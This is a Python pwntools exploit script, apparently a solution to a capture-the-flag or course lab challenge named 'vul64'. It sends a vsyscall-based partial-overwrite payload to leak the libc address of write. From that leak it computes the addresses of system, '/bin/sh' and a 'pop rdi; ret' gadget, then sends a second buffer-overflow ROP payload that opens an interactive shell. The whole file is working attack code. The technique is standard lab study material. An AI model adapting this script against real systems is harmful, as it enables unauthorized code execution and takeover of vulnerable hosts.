from pwn import *

sh = process('./vul64/vul64')
# sh = remote('cssc.vul337.team', 49350) # connect to the remote server

pop_addr = 0x21112 # the address of the gadget "pop rdi; ret"

pwnlib.gdb.attach(sh)

payload = p64(0xffffffffff600000) * 34 + b'\x2c' # create the payload 1, 

vul64 = ELF('./vul64/vul64')
libc = ELF('./vul64/libc.so.6')

print(sh.recvline())
sh.send(payload)

rcvdata = sh.recvuntil('Want my flag? Keep going!') # hacked into sub_A2c

write_addr = u64(rcvdata.split(b'\n')[4]) # get the address of the gift write function
print(write_addr)

offset = write_addr - libc.symbols['write'] # calculate the offset of the libc

system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))

print(system_addr)
print(binsh_addr)

system_addr = offset + system_addr # calculate the address of the system function in libc
binsh_addr = offset + binsh_addr # calculate the address of the "/bin/sh" string in libc
pop_addr = offset + pop_addr # calculate the address of the gadget "pop rdi; ret"

print(p64(system_addr))
print(p64(binsh_addr))
print(p64(pop_addr))

payload = b'A' * 0x33 + b"G" + p64(pop_addr) + p64(binsh_addr) + p64(system_addr) # create the payload 2, used to get the shell, similar to the payload 2 in lab1/vul32/exp_vul32.py
sh.sendline(payload)

sh.recv()
sh.interactive()
